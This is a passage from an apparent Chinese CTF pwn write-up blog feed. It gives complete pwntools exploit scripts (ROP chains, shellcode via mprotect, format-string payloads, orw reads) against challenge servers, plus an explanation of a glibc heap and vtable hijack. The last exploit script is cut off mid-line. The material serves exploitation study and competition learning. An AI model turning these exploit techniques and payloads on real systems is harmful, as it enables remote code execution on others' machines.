class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"Memory_Monster_III"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port=<span class="string">'183.129.189.60'</span>,<span class="number">10008</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">m</span><span class="params">(address,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'addr:'</span>,p64(address))</span><br><span class="line">p.sendafter(<span class="string">'data:'</span>,content)</span><br><span class="line"></span><br><span class="line">m(<span class="number">0x4B50B0</span>,p64(<span class="number">0x402CA0</span>) + p64(<span class="number">0x401C1D</span>))</span><br><span class="line"></span><br><span class="line">pop_rdx_rsi = <span class="number">0x44AB09</span></span><br><span class="line">mov_rax_rdx = <span class="number">0x41AE80</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x401746</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x447635</span></span><br><span class="line">leave_ret = <span class="number">0x401CF3</span></span><br><span class="line">ret = <span class="number">0x401016</span></span><br><span class="line">mprotect = <span class="number">0x448420</span></span><br><span class="line">read = <span class="number">0x447620</span></span><br><span class="line"></span><br><span class="line">shell_a = <span class="number">0x4BC100</span></span><br><span class="line">shell = asm(shellcraft.sh())</span><br><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span>,p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_rsi))</span><br><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span>,p64(<span class="number">0x200</span>) + p64(shell_a) + p64(read))</span><br><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span> + <span class="number">0x18</span>,p64(pop_rdi_ret) + p64(shell_a <span class="number">-0x100</span>) + p64(pop_rdx_rsi))</span><br><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span> + <span class="number">0x18</span> + <span class="number">0x18</span>,p64(<span class="number">7</span>) + p64(<span class="number">0x1000</span>) + p64(mprotect))</span><br><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span> + <span class="number">0x18</span> + <span class="number">0x18</span> + <span class="number">0x18</span>,p64(shell_a))</span><br><span class="line">m(<span class="number">0x4B50B0</span>,p64(leave_ret) + p64(ret) + p64(pop_rdi_ret))</span><br><span class="line"></span><br><span class="line">p.sendline(shell)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="secret2"><a href="#secret2" class="headerlink" title="secret2"></a>secret2</h2><p>文件描述符最多有1024个，也就是说最多打开文件1024多次,就不能继续打开了,则随机值之后全是0,因此输入”\x00”字节就能通过memcmp检测，然后close(0)，memcpy栈溢出， 只能orw flag了，并且此题远程是2.30的。2.23本地调试的时候有点不同。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># --- auther nocbtm ---</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">pwn_name = <span class="string">"secret3"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'183.129.189.60'</span>,<span class="number">10056</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='i386')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'libc6_2.30-0ubuntu2_amd64.so'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cus_rop</span><span class="params">(gadget1,gadget2,func_got,rdi,rsi,rdx)</span>:</span></span><br><span class="line">    payload = p64(gadget1)</span><br><span class="line">    payload += p64(<span class="number">0</span>)         <span class="comment">#rbx=0</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)         <span class="comment">#rbp=1</span></span><br><span class="line">    payload += p64(func_got)  <span class="comment">#r12  call</span></span><br><span class="line">    payload += p64(rdi)       <span class="comment">#r13  rdx read size</span></span><br><span class="line">    payload += p64(rsi)       <span class="comment">#r14  rsi</span></span><br><span class="line">    payload += p64(rdx)       <span class="comment">#r15  edi read canshu</span></span><br><span class="line">    payload += p64(gadget2)</span><br><span class="line">    payload += <span class="string">'\x00'</span>*<span class="number">56</span>      <span class="comment">#tiao zheng zhan zhen</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(0x401433)</span></span><br><span class="line">rdi=<span class="number">0x40161b</span></span><br><span class="line">ret=<span class="number">0x401016</span></span><br><span class="line">rsi_r15=<span class="number">0x401619</span></span><br><span class="line">bss=elf.bss()+<span class="number">0x300</span></span><br><span class="line">p.recvuntil(<span class="string">"name? ________________ #"</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>+p64(<span class="number">0x4021df</span>)</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">0x4021df</span>)+p64(rsi_r15)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(elf.plt[<span class="string">"open"</span>])</span><br><span class="line">payload+=cus_rop(<span class="number">0x401612</span>,<span class="number">0x4015F8</span>,elf.got[<span class="string">'read'</span>],<span class="number">0</span>,bss,<span class="number">64</span>)</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">1</span>)+p64(elf.plt[<span class="string">"write"</span>])</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1255</span>):</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    payload=<span class="string">"\x00"</span></span><br><span class="line">    p.recvuntil(<span class="string">"Secret: _____            #"</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">1254</span>:</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        leak=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))</span></span><br><span class="line"><span class="string">        libc.address=leak-0x7fcb248f9690+0x7fcb2488a000</span></span><br><span class="line"><span class="string">        info("leak",leak)</span></span><br><span class="line"><span class="string">        info("libc",libc.address)</span></span><br><span class="line"><span class="string">        sleep(1)</span></span><br><span class="line"><span class="string">        p.recv()</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        p.interactive()</span><br></pre></td></tr></table></figure><h2 id="easybabystack"><a href="#easybabystack" class="headerlink" title="easybabystack"></a>easybabystack</h2><p>这题比赛的时候也没做出来，参考fmyy师傅的题解</p><p> 格式化字符串中 *$连用表示取对应偏移位置的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level =<span class="string">'DEBUG'</span></span><br><span class="line">p= process(<span class="string">'./main'</span>)</span><br><span class="line">p = remote(<span class="string">'183.129.189.60'</span>,<span class="number">10001</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'username:'</span>,<span class="string">'%*18$d%5$n'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,"b *0x401512")</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x401733</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x401731</span></span><br><span class="line">binsh  =<span class="number">0x404090</span></span><br><span class="line">system = <span class="number">0x401110</span></span><br><span class="line">read_got = <span class="number">0x404038</span></span><br><span class="line">gadget_I = <span class="number">0x40172A</span></span><br><span class="line">gadget_Ii = <span class="number">0x401710</span></span><br><span class="line">payload  = <span class="string">'U'</span>*<span class="number">0x118</span></span><br><span class="line">payload += p64(gadget_I)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(<span class="number">8</span>)</span><br><span class="line">payload += p64(read_got)</span><br><span class="line">payload += p64(gadget_Ii)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(binsh) + p64(system)</span><br><span class="line">p.recvuntil(<span class="string">'message'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;盲打1-盲打2&quot;&gt;&lt;a href=&quot;#盲打1-盲打2&quot; class=&quot;headerlink&quot; title=&quot;盲打1 盲打2&quot;&gt;&lt;/a&gt;盲打1 盲打2&lt;/h2&gt;&lt;p&gt;都是一个c语言解释器，但是不能用&lt;code&gt;()&lt;/code&gt;来写c语言，也就是不能调用函数，可以用
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>GKCTF pwn writeup</title>
    <link href="https://nocbtm.github.io/2020/05/24/GKCTF-pwn-writeup/"/>
    <id>https://nocbtm.github.io/2020/05/24/GKCTF-pwn-writeup/</id>
    <published>2020-05-24T10:04:51.000Z</published>
    <updated>2020-05-28T01:26:57.702Z</updated>
    
    <content type="html"><![CDATA[<h2 id="domo"><a href="#domo" class="headerlink" title="domo"></a>domo</h2><p>一道 domo日了一天，最后还是做出来，还是很高兴的</p><p><code>off-by-null</code>漏洞，edit功能有任意地址一字节写入，可以用来伪造堆块的size，<code>malloc_fook</code>和<code>free_hook</code>程序做有限制，然后又有<code>sanbox</code>。但是是在main函数结束的时候才生效的，只要在while循环里面调用<code>onegadget</code>，还是能反弹shell的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x07 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0009</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="keyword">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x04 0xffffffff  <span class="keyword">if</span> (A != 0xffffffff) goto 0009</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x0000000a  <span class="keyword">if</span> (A == mprotect) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x0000003b  <span class="keyword">if</span> (A == execve) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0xffffd8b6  <span class="keyword">if</span> (A == 0xffffd8b6) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure><p>一开始的思路是想用 <code>environ</code>来泄露 <code>stack_addr</code>然后再申请堆块到栈上用<code>orw</code>的方式来做</p><p>然后费了好大的劲，泄露出stack的地址了，stack上没有合适的size而且还有麻烦的<code>canary</code></p><p>最后选择伪造 <code>_IO_2_1_stdin_</code>的<code>vtable</code>为heap地址，heap里面存放着<code>onegadget</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p stdin</span><br><span class="line">$1 = (struct _IO_FILE *) 0x7f991f79b8e0 &lt;_IO_2_1_stdin_&gt;</span><br><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus *) 0x7f991f79b8e0</span><br><span class="line">$2 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539512, </span><br><span class="line">    _IO_read_ptr = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_read_end = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_read_base = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_write_base = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_write_ptr = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_write_end = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_buf_base = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_buf_end = 0x557376e65010 &quot;&quot;, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 16, </span><br><span class="line">    _old_offset = -1, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &apos;\000&apos;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x7f991f79d790 &lt;_IO_stdfile_0_lock&gt;, </span><br><span class="line">    _offset = -1, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x7f991f79b9c0 &lt;_IO_wide_data_0&gt;, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 113, </span><br><span class="line">    _mode = -1, </span><br><span class="line">    _unused2 = &apos;\000&apos; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7f991f79a6e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上是伪造 <code>_IO_file_jumps</code>结构体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_file_jumps</span><br><span class="line">$3 = &#123;</span><br><span class="line">  __dummy = 0, </span><br><span class="line">  __dummy2 = 0, </span><br><span class="line">  __finish = 0x7f991f4509c0 &lt;_IO_new_file_finish&gt;, </span><br><span class="line">  __overflow = 0x7f991f451730 &lt;_IO_new_file_overflow&gt;, </span><br><span class="line">  __underflow = 0x7f991f4514a0 &lt;_IO_new_file_underflow&gt;, </span><br><span class="line">  __uflow = 0x7f991f452600 &lt;__GI__IO_default_uflow&gt;, </span><br><span class="line">  __pbackfail = 0x7f991f453980 &lt;__GI__IO_default_pbackfail&gt;, </span><br><span class="line">  __xsputn = 0x7f991f4501e0 &lt;_IO_new_file_xsputn&gt;, </span><br><span class="line">  __xsgetn = 0x7f991f44fec0 &lt;__GI__IO_file_xsgetn&gt;, </span><br><span class="line">  __seekoff = 0x7f991f44f4c0 &lt;_IO_new_file_seekoff&gt;, </span><br><span class="line">  __seekpos = 0x7f991f452a00 &lt;_IO_default_seekpos&gt;, </span><br><span class="line">  __setbuf = 0x7f991f44f430 &lt;_IO_new_file_setbuf&gt;, </span><br><span class="line">  __sync = 0x7f991f44f370 &lt;_IO_new_file_sync&gt;, </span><br><span class="line">  __doallocate = 0x7f991f444180 &lt;__GI__IO_file_doallocate&gt;, </span><br><span class="line">  __read = 0x7f991f4501a0 &lt;__GI__IO_file_read&gt;, </span><br><span class="line">  __write = 0x7f991f44fb70 &lt;_IO_new_file_write&gt;, </span><br><span class="line">  __seek = 0x7f991f44f970 &lt;__GI__IO_file_seek&gt;, </span><br><span class="line">  __close = 0x7f991f44f340 &lt;__GI__IO_file_close&gt;, </span><br><span class="line">  __stat = 0x7f991f44fb60 &lt;__GI__IO_file_stat&gt;, </span><br><span class="line">  __showmanyc = 0x7f991f453af0 &lt;_IO_default_showmanyc&gt;, </span><br><span class="line">  __imbue = 0x7f991f453b00 &lt;_IO_default_imbue&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>先利用<code>unsortedbin_attack</code>泄露出libc基址和heap地址</p><p>然后 <code>off-by-null</code>溢出修改下一个堆块的 size 为 <code>\x00</code>使得他被修改为释放过的</p><p>通过布局，unlink使得堆块向前合并，造成堆块重叠，<code>fastbin_attack</code> 打<code>vtable</code>,需要用edit功能提前伪造size。</p><p><code>_IO_file_jumps</code>里面全放<code>onegadget</code>然后劫持程序执行流 ，生效的是<code>__xsputn</code>这里的<code>onegadget</code></p><p>看下puts函数的具体实现</p><p>代码来自：<a href="https://code.woboq.org/userspace/glibc/" target="_blank" rel="noopener">glibc</a>/<a href="https://code.woboq.org/userspace/glibc/libio/" target="_blank" rel="noopener">libio</a>/<a href="https://code.woboq.org/userspace/glibc/libio/ioputs.c.html" target="_blank" rel="noopener">ioputs.c</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_puts (<span class="keyword">const</span> <span class="keyword">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = EOF;</span><br><span class="line">  <span class="keyword">size_t</span> len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (<span class="built_in">stdout</span>);</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (<span class="built_in">stdout</span>) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (<span class="built_in">stdout</span>, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (<span class="built_in">stdout</span>, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">'\n'</span>, <span class="built_in">stdout</span>) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">  _IO_release_lock (<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里实际上是调用了<code>_IO_sputn</code>这个函数，当然这个<code>_IO_sputn</code>实际上就是一个宏，调用了<code>_IO_2_1_stdout_</code>的vtable中的<code>__xsputn</code>，也就是<code>_IO_new_file_xsputn</code>函数。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"domo"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span 